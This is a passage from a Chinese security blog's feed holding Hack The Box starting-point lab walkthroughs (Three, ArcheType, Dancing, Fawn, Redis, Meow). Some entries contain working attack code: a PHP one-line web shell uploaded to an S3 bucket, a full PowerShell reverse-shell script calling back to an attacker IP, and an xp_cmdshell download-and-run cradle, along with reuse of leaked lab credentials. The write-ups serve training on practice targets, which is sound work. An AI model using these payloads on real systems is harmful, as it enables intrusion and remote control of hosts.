hostnames?<br>/etc/hosts<br>Which sub-<span class="hljs-keyword">domain</span> <span class="hljs-keyword">is</span> discovered during further enumeration?<br>s3.thetoppers.htb<br>Which service <span class="hljs-keyword">is</span> running <span class="hljs-keyword">on</span> the discovered sub-<span class="hljs-keyword">domain</span>?<br>Amazon S3<br>Which command <span class="hljs-type">line</span> utility can be used <span class="hljs-keyword">to</span> interact <span class="hljs-keyword">with</span> the service running <span class="hljs-keyword">on</span> the discovered sub-<span class="hljs-keyword">domain</span>?<br>awscli<br>Which command <span class="hljs-keyword">is</span> used <span class="hljs-keyword">to</span> <span class="hljs-keyword">set</span> up the AWS CLI installation?<br>aws configure<br>What <span class="hljs-keyword">is</span> the command used <span class="hljs-keyword">by</span> the above utility <span class="hljs-keyword">to</span> list <span class="hljs-keyword">all</span> <span class="hljs-keyword">of</span> the S3 buckets?<br>aws s3 ls<br>This <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> configured <span class="hljs-keyword">to</span> run files written <span class="hljs-keyword">in</span> what web scripting <span class="hljs-keyword">language</span>?<br>PHP<br></code></pre></td></tr></table></figure><h5 id="二、获取Flag"><a href="#二、获取Flag" class="headerlink" title="二、获取Flag"></a>二、获取Flag</h5><p>先对靶机IP进行端口扫描查看开放哪些端口</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112007484.png" alt="image-20230211200724185"></p><p>火狐浏览器访问该IP地址，在网页当中找到一个域名<code>thetoppers.htb</code></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112009222.png" alt="image-20230211200913528"></p><p>使用OneForAll进行子域名爆破找到其中一个子域名<code>s3.thetoppers.htb</code></p><p>在没有 DNS 服务器的情况下，我们可以使用Hosts文件将主机名解析为 IP 地址，以便能够访问指向这些主机名的网站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;10.129.192.178 thetoppers.htb&#x27;</span> &gt;&gt; /etc/hosts<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;10.129.192.178 s3.thetoppers.htb&#x27;</span> &gt;&gt; /etc/hosts<br></code></pre></td></tr></table></figure><ul><li>浏览器访问s3.thetoppers.htb</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112052435.png" alt="image-20230211205257478"></p><ul><li>通过子域名爆破，得知该域名是使用亚马逊服务器，下载安装aws</li><li>使用<code>aws configure</code>进行配置</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112209728.png" alt="image-20230211220937436"></p><p>查看所有s3的服务</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">aws <span class="hljs-params">--endpoint=http</span>:<span class="hljs-string">//s3.thetoppers.htb</span> s3 <span class="hljs-keyword">ls</span> <br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112210680.png" alt="image-20230211221044821"></p><p>查看该s3下的目录及对象</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112211583.png" alt="image-20230211221152799"></p><p>编写一句话木马，使用cp命令拷贝到s3的桶里，并查看结果</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">echo &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27; &gt; shell.php</span><br><span class="language-xml">aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112214972.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112214735.png"></p><ul><li><p>使用<code>cmd=cat+../flag.txt</code>可以直接拿到flag</p></li><li><pre><code class="hljs">http://thetoppers.htb/shell.php?cmd=cat+../flag.txt</code></pre></li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302112223189.png"></p>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackBox---ArcheType</title>
    <link href="/2022/11/20/HackBox---ArcheType/"/>
    <url>/2022/11/20/HackBox---ArcheType/</url>
    
    <content type="html"><![CDATA[<h3 id="ArcheType"><a href="#ArcheType" class="headerlink" title="ArcheType"></a>ArcheType</h3><h4 id="一、问题"><a href="#一、问题" class="headerlink" title="一、问题"></a>一、问题</h4><ul><li>Which TCP port is hosting a database server?(哪个TCP端口托管数据库服务器？)<ul><li>1433</li></ul></li><li>What is the name of the non-Administrative share available over SMB?(SMB上可用的非管理共享的名称是什么？)<ul><li>backups</li></ul></li><li>What is the password identified in the file on the SMB share?(SMB共享文件中标识的密码是什么？)<ul><li>M3g4c0rp123</li></ul></li><li>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?(可以使用Impacket集合中的哪个脚本来建立与Microsoft SQL Server的身份验证连接？)<ul><li>mssqlclient.py</li></ul></li><li>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?(可以使用Microsoft SQL Server的哪些扩展存储过程来生成Windows命令shell？)<ul><li>xp_cmdshell</li></ul></li><li>What script can be used in order to search possible paths to escalate privileges on Windows hosts?(可以使用什么脚本来搜索可能的路径以升级Windows主机上的权限？)<ul><li>winpeas</li></ul></li><li>What file contains the administrator’s password?(哪个文件包含管理员密码？)<ul><li>ConsoleHost_history.txt</li></ul></li></ul><h4 id="二、过程"><a href="#二、过程" class="headerlink" title="二、过程"></a>二、过程</h4><ul><li>首先获取到靶场IP地址：10.129.147.7</li><li>一般的渗透思路都是域名-IP-端口-服务，这里已经给出IP，所以下一步考虑这个IP下开了哪些端口，端口上又有什么服务</li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -sC -sV <span class="hljs-number">10.129.147.7</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111733612.png"></p><p>根据第二个问题需要用到SMB，所以得用Kali中自带的smbclient(smbclient命令属于<a href="https://so.csdn.net/so/search?q=samba&spm=1001.2101.3001.7020">samba</a>套件，它提供一种命令行使用交互式方式访问samba服务器的共享资源。)</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs diff">smbclient -N -L 10.129.147.7<br><br><span class="hljs-deletion">-B&lt;ip地址&gt;：传送广播数据包时所用的IP地址；</span><br><span class="hljs-deletion">-d&lt;排错层级&gt;：指定记录文件所记载事件的详细程度；</span><br><span class="hljs-deletion">-E：将信息送到标准错误输出设备；</span><br><span class="hljs-deletion">-h：显示帮助；</span><br><span class="hljs-deletion">-i&lt;范围&gt;：设置NetBIOS名称范围；</span><br><span class="hljs-deletion">-I&lt;IP地址&gt;：指定服务器的IP地址；</span><br><span class="hljs-deletion">-l&lt;记录文件&gt;：指定记录文件的名称；</span><br><span class="hljs-deletion">-L：显示服务器端所分享出来的所有资源；</span><br><span class="hljs-deletion">-M&lt;NetBIOS名称&gt;：可利用WinPopup协议，将信息送给选项中所指定的主机；</span><br><span class="hljs-deletion">-n&lt;NetBIOS名称&gt;：指定用户端所要使用的NetBIOS名称；</span><br><span class="hljs-deletion">-N：不用询问密码；</span><br><span class="hljs-deletion">-O&lt;连接槽选项&gt;：设置用户端TCP连接槽的选项；</span><br><span class="hljs-deletion">-p&lt;TCP连接端口&gt;：指定服务器端TCP连接端口编号；</span><br><span class="hljs-deletion">-R&lt;名称解析顺序&gt;：设置NetBIOS名称解析的顺序；</span><br><span class="hljs-deletion">-s&lt;目录&gt;：指定smb.conf所在的目录；</span><br><span class="hljs-deletion">-t&lt;服务器字码&gt;：设置用何种字符码来解析服务器端的文件名称；</span><br><span class="hljs-deletion">-T&lt;tar选项&gt;：备份服务器端分享的全部文件，并打包成tar格式的文件；</span><br><span class="hljs-deletion">-U&lt;用户名称&gt;：指定用户名称；</span><br><span class="hljs-deletion">-w&lt;工作群组&gt;：指定工作群组名称。</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111751431.png" alt="image-20230211175123427"></p><ul><li>下来就是进入到这个backups里面看看里面都有什么东西</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -N //10.129.147.7/backups<br><span class="hljs-built_in">ls</span><br>get prod.dtsConfig<br><span class="hljs-built_in">cat</span> prod.dtsConfig  ---重新启动一个终端<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111756797.png" alt="image-20230211175644838"></p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">DTSConfiguration&gt;<br>    &lt;DTSConfigurationHeading&gt;<br>        &lt;DTSConfigurationFileInfo GeneratedBy<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageName<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageID<span class="hljs-operator">=</span><span class="hljs-string">&quot;...&quot;</span> GeneratedDate<span class="hljs-operator">=</span><span class="hljs-string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;<br>    &lt;/DTSConfigurationHeading&gt;<br>    &lt;Configuration ConfiguredType<span class="hljs-operator">=</span><span class="hljs-string">&quot;Property&quot;</span> Path<span class="hljs-operator">=</span><span class="hljs-string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> ValueType<span class="hljs-operator">=</span><span class="hljs-string">&quot;String&quot;</span>&gt;<br>        &lt;ConfiguredValue&gt;Data Source<span class="hljs-operator">=</span>.<span class="hljs-comment">;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;</span><br>    &lt;/Configuration&gt;<br>&lt;/DTSConfiguration&gt;<br></code></pre></td></tr></table></figure><ul><li>找到账号和密码，下一步就是利用这个账号和密码登录这个SQL</li><li>Kali中使用了impacket-mssqlclient工具连接SQL，这是第三方工具需要从github上下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/CoreSecurity/impacket.git<br><span class="hljs-built_in">cd</span> impacket/<br>python setup.py install<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111808130.png" alt="image-20230211180809997"></p><ul><li>使用<code>SELECT IS_SRVROLEMEMBER(&#39;sysadmin&#39;)</code>查看当前是否有sysadmin（最高级别）的 SQL Server 权限，返回1，则表示具有该权限</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111810616.png" alt="image-20230211181030596"></p><ul><li>有了权限使用xp_cmdshell 并在主机上获得 RCE</li><li></li></ul><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sqf">enable_xp_cmdshell             <span class="hljs-comment">//开启xp_cmdshell，如果不能则需要执行下边几行命令</span><br><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;Show Advanced Options&#x27;</span>, <span class="hljs-number">1</span>;  <span class="hljs-comment">//允许修改数据库高级配置选项</span><br>reconfigure;                                   <span class="hljs-comment">//确认上面的操作</span><br><span class="hljs-built_in">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;            <span class="hljs-comment">//启用xp_cmdshell，允许SQL server执行系统命令</span><br>reconfigure;                                   <span class="hljs-comment">//确认上面的操作</span><br>xp_cmdshell <span class="hljs-string">&quot;whoami&quot;</span>                           <span class="hljs-comment">//查看当前权限</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111815616.png" alt="image-20230211181532383"></p><p>往下就是要反弹shell</p><p>在桌面新建一个文件shell.ps1，在文件当中写入如下内容：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$client</span> = <span class="hljs-built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="hljs-string">&quot;10.10.16.93&quot;</span>,<span class="hljs-number">443</span>);<span class="hljs-variable">$stream</span> = <span class="hljs-variable">$client</span>.GetStream();[<span class="hljs-built_in">byte</span>[]]<span class="hljs-variable">$bytes</span> = <span class="hljs-number">0</span>..<span class="hljs-number">65535</span>|%&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-keyword">while</span>((<span class="hljs-variable">$i</span> = <span class="hljs-variable">$stream</span>.Read(<span class="hljs-variable">$bytes</span>, <span class="hljs-number">0</span>, <span class="hljs-variable">$bytes</span>.Length)) <span class="hljs-operator">-ne</span> <span class="hljs-number">0</span>)&#123;;<span class="hljs-variable">$data</span> = (<span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="hljs-variable">$bytes</span>,<span class="hljs-number">0</span>, <span class="hljs-variable">$i</span>);<span class="hljs-variable">$sendback</span> = (<span class="hljs-built_in">iex</span> <span class="hljs-variable">$data</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | <span class="hljs-built_in">Out-String</span> );<span class="hljs-variable">$sendback2</span> = <span class="hljs-variable">$sendback</span> + <span class="hljs-string">&quot;# &quot;</span>;<span class="hljs-variable">$sendbyte</span> = ([<span class="hljs-type">text.encoding</span>]::ASCII).GetBytes(<span class="hljs-variable">$sendback2</span>);<span class="hljs-variable">$stream</span>.Write(<span class="hljs-variable">$sendbyte</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$sendbyte</span>.Length);<span class="hljs-variable">$stream</span>.Flush()&#125;;<span class="hljs-variable">$client</span>.Close()<br></code></pre></td></tr></table></figure><p>把里面的IP换成本地IP地址(使用ifconfig—然后查看tun0的IP)</p><p>重新开启两个终端一个开启80，一个开启443</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> -m http.server <span class="hljs-number">80</span><br><span class="hljs-attribute">nc</span> -lvnp <span class="hljs-number">4443</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111914937.png" alt="image-20230211191418541"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111914897.png" alt="image-20230211191446735"></p><p>在SQL终端下使用</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">xp_cmdshell &quot;powershell &quot;<span class="hljs-keyword">Import</span>-Module Microsoft.PowerShell.Utility;IEX (<span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> Net.WebClient).DownloadString(\&quot;http://10.10.16.93/shell.ps1\&quot;);&quot;&quot;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111918835.png" alt="image-20230211191854791"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111919736.png" alt="image-20230211191917351"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111921279.png" alt="image-20230211191958289"></p><p>以上在443终端下，出现#号说明反弹成功</p><p>此时使用：</p><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\Desktop\user.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111922531.png" alt="image-20230211192216167"></p><ul><li>拿到第一个flag</li><li>使用如下命令获取到powershell的历史记录</li></ul><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript"><span class="hljs-built_in">type</span> <span class="hljs-name">C</span>:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.tx<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111925178.png" alt="image-20230211192539209"></p><p>我们可以看出该用户执行过命令 <code>net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!</code>。该命令的作用是将主机ARchetype上的backups文件夹映射到自己的T盘，后面紧随着用户名和密码。</p><p>使用命令<code>impacket-psexec administrator@10.129.147.7</code>进行提权</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111928130.png" alt="image-20230211192843921"></p><p>在<code>type C:\Users\Administrator\Desktop\root.txt</code>得到最后一个flag</p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302111932561.png" alt="image-20230211193246449"></p><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><ul><li><a href="https://wangchujiang.com/linux-command/c/smbclient.html">https://wangchujiang.com/linux-command/c/smbclient.html</a></li><li><a href="https://www.cnblogs.com/masses0x1/p/15780893.html">https://www.cnblogs.com/masses0x1/p/15780893.html</a></li><li><a href="https://blog.csdn.net/XXX26/article/details/118113329">https://blog.csdn.net/XXX26/article/details/118113329</a></li><li><a href="https://www.freebuf.com/articles/web/175208.html">https://www.freebuf.com/articles/web/175208.html</a></li><li><a href="https://www.cnblogs.com/sup3rman/p/12381874.html">https://www.cnblogs.com/sup3rman/p/12381874.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackBox---起点(三)</title>
    <link href="/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9(%E4%B8%89)/"/>
    <url>/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9(%E4%B8%89)/</url>
    
    <content type="html"><![CDATA[<h3 id="HackBox—起点-三"><a href="#HackBox—起点-三" class="headerlink" title="HackBox—起点(三)"></a>HackBox—起点(三)</h3><ul><li>What does the 3-letter acronym SMB stand for?(3 个字母的首字母缩略词 SMB 代表什么？)<ul><li>Server Message Block</li></ul></li><li>What port does SMB use to operate at?(SMB 使用哪个端口进行操作？)<ul><li>445</li></ul></li><li>What is the service name for port 445 that came up in our Nmap scan?(我们的 Nmap 扫描中出现的端口 445 的服务名称是什么？)<ul><li>microsoft-ds</li></ul></li><li>What is the ‘flag’ or ‘switch’ we can use with the SMB tool to ‘list’ the contents of the share?(我们可以使用 SMB 工具来“列出”共享内容的“标志”或“开关”是什么？)<ul><li>-L</li></ul></li><li>How many shares are there on Dancing?(Dancing 有多少个)<ul><li>5</li></ul></li><li>What is the name of the share we are able to access in the end with a blank password?(我们最终能够使用空白密码访问的共享名称是什么？)<ul><li>WorkShares</li></ul></li><li>What is the command we can use within the SMB shell to download the files we find?(我们可以在 SMB shell 中使用什么命令来下载我们找到的文件？)<ul><li>get</li></ul></li><li>获取flag:</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302092346833.png" alt="image-20230209234633789"></li></ul><h5 id="备注："><a href="#备注：" class="headerlink" title="备注："></a>备注：</h5><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient \\\\<span class="hljs-number">10.129</span>.<span class="hljs-number">194.55</span>\\WorkShares     <span class="hljs-comment">#连接用户WorkShares</span><br>ls                                          <span class="hljs-comment">#列出WorkShares目录下信息</span><br>cd James.p                                  <span class="hljs-comment">#进入目录James.p</span><br>ls                                          <span class="hljs-comment">#列出James.p目录下信息</span><br>get flag.txt                                <span class="hljs-comment">#下载文件flag.txt到本地</span><br><span class="hljs-keyword">exit</span>                                        <span class="hljs-comment">#退出SMB服务</span><br>cat flag.txt                                <span class="hljs-comment">#查看flag.txt</span><br></code></pre></td></tr></table></figure><h5 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h5><ul><li><a href="https://www.cnblogs.com/Hekeats-L/p/16535920.html">https://www.cnblogs.com/Hekeats-L/p/16535920.html</a></li><li><a href="https://docs.oracle.com/cd/E19253-01/820-5488/gfhaq/index.html">https://docs.oracle.com/cd/E19253-01/820-5488/gfhaq/index.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackBox---起点(二)</title>
    <link href="/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9(%E4%BA%8C)/"/>
    <url>/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9(%E4%BA%8C)/</url>
    
    <content type="html"><![CDATA[<h3 id="HackBox—起点-二"><a href="#HackBox—起点-二" class="headerlink" title="HackBox—起点(二)"></a>HackBox—起点(二)</h3><ul><li><p>What does the 3-letter acronym FTP stand for?(3 个字母的首字母缩略词 FTP 代表什么？)</p><ul><li>File Transfer Protocol(文件传输协议)</li></ul></li><li><p>Which port does the FTP service listen on usually?(FTP服务通常监听哪个端口？)</p><ul><li>21</li></ul></li><li><p>What acronym is used for the secure version of FTP?(FTP 的安全版本使用什么首字母缩写词？)</p><ul><li>SFTP</li></ul></li><li><p>What is the command we can use to send an ICMP echo request to test our connection to the target?(我们可以使用什么命令发送 ICMP 回显请求来测试我们与目标的连接？)</p><ul><li>ping</li></ul></li><li><p>From your scans, what version is FTP running on the target?(根据您的扫描结果，目标上运行的 FTP 版本是什么？)</p><ul><li>vsftpd 3.0.3</li></ul></li><li><p>From your scans, what OS type is running on the target?(根据您的扫描结果，目标上运行的操作系统类型是什么？)</p><ul><li>Unix</li></ul></li><li><p>What is the command we need to run in order to display the ‘ftp’ client help menu?(为了显示“ftp”客户端帮助菜单，我们需要运行什么命令？)</p><ul><li>ftp -h</li></ul></li><li><p>What is username that is used over FTP when you want to log in without having an account?(当您想在没有帐户的情况下登录时，通过 FTP 使用的用户名是什么？)</p><ul><li>anonymous</li></ul></li><li><p>What is the response code we get for the FTP message ‘Login successful’?(我们得到的 FTP 消息“登录成功”的响应代码是什么？)</p><ul><li>230</li></ul></li><li><p>There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system.(我们可以使用几个命令来列出 FTP 服务器上可用的文件和目录。一个是目录。另一种是在 Linux 系统上列出文件的常用方法。)</p><ul><li>ls</li></ul></li><li><p>What is the command used to download the file we found on the FTP server?(用于下载我们在 FTP 服务器上找到的文件的命令是什么？)</p><ul><li>get</li></ul></li><li><p>获取flag</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302092222339.png" alt="image-20230209222253771"></p><p><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302092225390.png" alt="image-20230209222507154"></p></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackBox---起点(四)</title>
    <link href="/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9(%E5%9B%9B)/"/>
    <url>/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9(%E5%9B%9B)/</url>
    
    <content type="html"><![CDATA[<h4 id="HackBox—起点-四"><a href="#HackBox—起点-四" class="headerlink" title="HackBox—起点(四)"></a>HackBox—起点(四)</h4><ul><li>Which TCP port is open on the machine?(机器上打开了哪个 TCP 端口？)<ul><li>6379</li></ul></li><li>Which service is running on the port that is open on the machine?(哪个服务在机器上打开的端口上运行？)<ul><li>redis</li></ul></li><li>What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database(Redis 是什么类型的数据库？从以下选项中进行选择：(i) 内存数据库，(ii) 传统数据库)<ul><li>In-memory Database</li></ul></li><li>Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.(哪个命令行实用程序用于与 Redis 服务器交互？输入您要在终端中输入的程序名称，不带任何参数。)<ul><li>redis-cli</li></ul></li><li>Which flag is used with the Redis command-line utility to specify the hostname?(Redis 命令行实用程序使用哪个标志来指定主机名？)<ul><li>-h</li></ul></li><li>Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?(连接到Redis服务器后，使用哪个命令获取有关Redis服务器的信息和统计信息？)<ul><li>info</li></ul></li><li>What is the version of the Redis server being used on the target machine?(目标机器上使用的 Redis 服务器的版本是什么？)<ul><li>5.0.7</li></ul></li><li>Which command is used to select the desired database in Redis?(在 Redis 中使用哪个命令来选择所需的数据库？)<ul><li>select</li></ul></li><li>How many keys are present inside the database with index 0?(索引为 0 的数据库中有多少个键？)<ul><li>4</li></ul></li><li>Which command is used to obtain all the keys in a database?(哪个命令用于获取数据库中的所有键？)<ul><li>keys *</li></ul></li></ul><p>参考链接:</p><ul><li><a href="https://www.cnblogs.com/Hekeats-L/p/16536247.html">https://www.cnblogs.com/Hekeats-L/p/16536247.html</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackBox---起点</title>
    <link href="/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9/"/>
    <url>/2022/11/20/HackBox---%E8%B5%B7%E7%82%B9/</url>
    
    <content type="html"><![CDATA[<h3 id="HackBox—起点"><a href="#HackBox—起点" class="headerlink" title="HackBox—起点"></a>HackBox—起点</h3><ul><li>What does the acronym VM stand for?<ul><li>Virtual Machine</li></ul></li><li>What tool do we use to interact with the operating system in order to issue commands via the command line, such as the one to start our VPN connection? It’s also known as a console or shell.<ul><li>terminal</li></ul></li><li>What service do we use to form our VPN connection into HTB labs?<ul><li>openvpn</li></ul></li><li>What is the abbreviated name for a ‘tunnel interface’ in the output of your VPN boot-up sequence output?<ul><li>tun</li></ul></li><li>What tool do we use to test our connection to the target with an ICMP echo request?<ul><li>ping</li></ul></li><li>What is the name of the most common tool for finding open ports on a target?<ul><li>nmap</li></ul></li><li>What service do we identify on port 23&#x2F;tcp during our scans?<ul><li>telnet</li></ul></li><li>What username is able to log into the target over telnet with a blank password?<ul><li>root</li></ul></li><li>flag获取方法:</li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302091858994.png" alt="image-20230209185855840"></li><li><img src="https://cdn.jsdelivr.net/gh/ROFGD/Drawingbed/202302091858224.png" alt="image-20230209185824404"></li></ul>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透---三层内网穿透实验</title>
    <link href="/2022/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F---%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E9%AA%8C/"/>
    <url>/2022/11/12/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F---%E4%B8%89%E5%B1%82%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%AE%9E%E9%AA%8C/</url>
    
